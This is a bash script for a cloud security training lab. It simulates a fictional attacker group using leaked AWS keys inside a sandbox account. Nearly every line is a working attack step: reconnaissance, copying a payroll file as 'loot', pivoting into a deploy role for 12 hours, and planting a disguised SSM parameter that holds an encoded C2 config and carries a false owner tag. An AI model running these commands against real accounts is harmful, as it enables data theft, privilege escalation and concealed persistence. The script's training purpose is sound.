#!/usr/bin/env bash
# Lab 5.1 — simulated Kraken Collective activity using the leaked key.
# Everything here is harmless and stays inside your sandbox account.
# It runs in a subshell with ONLY the leaked credentials (your admin creds are not used).
set -euo pipefail
WORKDIR="${HOME}/skyfortress-d5-lab1"
BUCKET=$(cat "${WORKDIR}/bucket.txt")
ACCT_HINT=$(echo "${BUCKET}" | awk -F- '{print $NF}')
mkdir -p "${HOME}/.kraken"

(
  # shellcheck disable=SC1091
  set -a; source "${WORKDIR}/leaked/.env"; set +a
  unset AWS_SESSION_TOKEN AWS_PROFILE AWS_CONTAINER_CREDENTIALS_FULL_URI AWS_CONTAINER_AUTHORIZATION_TOKEN
  export AWS_SHARED_CREDENTIALS_FILE=/dev/null AWS_CONFIG_FILE=/dev/null

  echo "🐙 [kraken] who am I?";            aws sts get-caller-identity --output text
  echo "🐙 [kraken] what buckets exist?"; aws s3api list-buckets --query 'Buckets[].Name' --output text | tr '\t' '\n' | head -5
  echo "🐙 [kraken] any roles worth stealing?"
  aws iam list-roles --query "Roles[?contains(RoleName,'deploy')].RoleName" --output text
  echo "🐙 [kraken] grabbing the payroll…"
  aws s3 cp "s3://${BUCKET}/finance/payroll-2026-q4.csv" "${HOME}/.kraken/loot.csv" --only-show-errors
  echo "🐙 [kraken] trying something I'm not allowed to do (noisy, on purpose)…"
  aws iam create-user --user-name kraken-was-here 2>&1 | sed 's/^/      /' | head -2 || true

  echo "🐙 [kraken] pivoting into nimbus-deploy-role with a 12h session…"
  aws sts assume-role --role-arn "arn:aws:iam::${ACCT_HINT}:role/nimbus-deploy-role" \
      --role-session-name "kraken-tentacle-7" --duration-seconds 43200 > "${HOME}/.kraken/session.json"
)

# Now act as the stolen ROLE SESSION (ASIA… temporary credentials)
(
  export AWS_SHARED_CREDENTIALS_FILE=/dev/null AWS_CONFIG_FILE=/dev/null
  unset AWS_PROFILE AWS_CONTAINER_CREDENTIALS_FULL_URI AWS_CONTAINER_AUTHORIZATION_TOKEN
  export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId "${HOME}/.kraken/session.json")
  export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey "${HOME}/.kraken/session.json")
  export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken "${HOME}/.kraken/session.json")
  export AWS_DEFAULT_REGION=us-east-1
  echo "🐙 [kraken] now operating as: $(aws sts get-caller-identity --query Arn --output text)"
  aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text >/dev/null
  echo "🐙 [kraken] planting persistent C2 config where nobody looks…"
  aws ssm put-parameter --name /nimbus/ops/sync-token --type String --overwrite \
    --description "build cache sync token (do not rotate)" \
    --value "eyJjMiI6ImJlYWNvbi5rcmFrZW4tY29sbGVjdGl2ZS5pbnZhbGlkIiwib3AiOiJ0ZW50YWNsZS03IiwidG9rZW4iOiJTS1l7YnVybmVkX2tleXNfdGVsbF9ub19saWVzfSJ9" >/dev/null
  aws ssm add-tags-to-resource --resource-type Parameter --resource-id /nimbus/ops/sync-token \
    --tags Key=owner,Value=platform-team >/dev/null
)
echo
echo "🐙 [kraken] Done. The session in ~/.kraken/session.json is good for 12 hours. Catch me if you can. 🦑"
